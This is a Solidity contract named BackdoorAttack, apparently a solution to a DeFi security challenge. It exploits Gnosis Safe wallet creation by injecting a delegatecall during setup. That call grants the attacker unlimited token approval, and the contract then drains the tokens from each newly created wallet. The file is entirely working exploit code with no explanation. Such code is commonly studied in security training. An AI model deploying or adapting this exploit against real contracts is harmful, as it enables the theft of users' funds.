// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";

contract BackdoorAttack{

    address immutable singleton;
    IERC20 immutable token;
    IProxyCreationCallback immutable registry;
    GnosisSafeProxyFactory immutable factory;


    constructor(
        address _singleton,
        address _token,
        address _registry,
        address _factory
    ) {
        singleton = _singleton;
        token = IERC20(_token);
        registry = IProxyCreationCallback(_registry);
        factory = GnosisSafeProxyFactory(_factory);
    }

    function approve(address _sender) external{
        token.approve(_sender, type(uint256).max);
    }

    function attack(address[] calldata _users, uint256 _amount) external {

        //create loop to cycle through all users in array
        for (uint256 i = 0; i < _users.length; i++) {
            address[] memory arr = new address[](1);
            arr[0] = _users[i];

            //create approve payload
            bytes memory _approvePayload = abi.encodeWithSignature("approve(address)", address(this));

            //create setup 
            bytes memory setup = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                arr, 
                uint256(1), 
                address(this), 
                _approvePayload, 
                address(0), 
                address(0), 
                uint256(0), 
                address(0)
            );
            //create new proxy contract and trigger approve through the delegatecall to attacker contract
            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                singleton, 
                setup, 
                block.timestamp, 
                registry);

            //tranfer funds from new proxy
            token.transferFrom(address(proxy), msg.sender, _amount);
        }
        
    }

}


